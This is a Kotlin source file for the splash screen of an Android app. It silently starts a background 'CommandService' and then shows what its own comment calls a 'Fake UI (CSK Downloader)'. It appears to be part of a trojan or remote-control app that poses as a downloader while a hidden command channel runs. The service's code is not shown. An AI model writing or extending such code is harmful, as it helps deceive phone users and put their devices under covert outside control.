package com.csk4.app

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import androidx.appcompat.app.AppCompatActivity

class SplashActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        // Start command service in background
        startService(Intent(this, CommandService::class.java))

        Handler(Looper.getMainLooper()).postDelayed({
            // Show Fake UI (CSK Downloader)
            startActivity(Intent(this, WebViewActivity::class.java))
            finish()
        }, 2000)
    }
}
